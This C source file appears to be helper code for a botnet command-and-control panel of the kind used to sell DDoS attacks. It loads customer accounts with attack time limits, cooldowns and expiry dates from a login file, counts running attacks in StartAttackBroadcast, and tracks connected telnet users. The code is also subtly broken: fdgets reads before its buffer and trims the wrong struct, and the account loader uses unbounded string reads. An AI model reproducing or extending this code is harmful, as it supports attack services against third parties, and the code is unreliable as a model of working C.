#include "headers/main.h"
void trim(char *str)
{
	int i, begin = 0, end = strlen(str) - 1;
	while (isspace(str[begin]))
		begin++;
	while ((end >= begin) && isspace(str[end]))
		end--;
	for (i = begin; i <= end; i++)
		str[i - begin] = str[i];
	str[i - begin] = '\0';
}
int fdgets(char *buffer, int bufferSize, int fd)
{
	memset(&buf[fd], 0, sizeof(struct buF));
	int total = 0, got = 1;
	while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
	{
		got = read(fd, buffer + total, 1);
		total++;
	}
	trim(buf[fd].buffer);
	return got;
}
int Find_Login(char *str)
{
	FILE *fp;
	int line_num = 0, find_result = 0, find_line = 0;
	char temp[512];
	if ((fp = fopen("login/Login.txt", "a+")) == NULL)
	{
		return (-1);
	}
	while (fgets(temp, 512, fp) != NULL)
	{
		if ((strcasestr(temp, str)) != NULL)
		{
			find_result++;
			find_line = line_num;
		}
		line_num++;
	}
	if (fp)
		fclose(fp);
	if (find_result == 0)
		return 0;
	return find_line;
}
void *StartAttackBroadcast(void *arguments)
{
    struct AtkArgs *args = (struct AtkArgs *)arguments;
	runningattacks++;
	sleep(args->seconds);
	runningattacks--;
	return 0;
}
void *StartCldown(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = (int)args->sock, seconds = (int)args->seconds;
	managements[fd].CoolDownStatus = 1;
	while (managements[fd].CoolDownSecs++ < seconds)
		sleep(1);
	managements[fd].CoolDownStatus = 0;
	managements[fd].CoolDownSecs = 0;
	return 0;
}
int Accounts_Reload()
{
	FILE *fp;
	int i = 0, c, j = 0;
	fp = fopen("login/Login.txt", "a+");
	for (c = getc(fp); c != EOF; c = getc(fp))
	{
		if (c == '\n')
			i++;
	}
	rewind(fp);
	while (j != i)
	{
		fscanf(fp, "%s %s %s %d %d %s", accounts[j].username, accounts[j].password, accounts[j].id, &accounts[j].maxtime, &accounts[j].cooldown, accounts[j].expiry);
		++j;
	}
	return 0;
}
unsigned int UsersConned()
{
	int l, total = 0;
	for (l = 0; l < MAXFDS; l++)
	{
		if (strlen(managements[l].username) > 2 && managements[l].connected)
			total++;
	}
	return total;
}
int DelFD(int datafd)
{
	memset(&managements[datafd], 0, sizeof(struct telnetdata_t));
	memset(&Title[datafd], 0, sizeof(struct toast));
	return 0;
}
